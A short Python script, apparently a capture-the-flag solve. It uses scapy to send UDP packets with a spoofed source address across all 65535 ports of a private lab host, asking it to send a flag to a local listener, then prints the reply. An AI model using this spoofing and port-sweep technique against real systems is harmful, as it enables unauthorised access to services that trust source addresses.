#!/usr/bin/python3
import socket
from scapy.all import *


conn = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
conn.bind(('0.0.0.0',31337))

for i in range(65535):
    pkt = IP(src="10.0.0.3",dst="10.0.0.2")/UDP(sport=31337,dport=i+1)/Raw(b"FLAG:10.0.0.1:31337")
    send(pkt,verbose=0)
    print(i)
print('all send')
data ,addr = conn.recvfrom(1024)

print(data.decode())
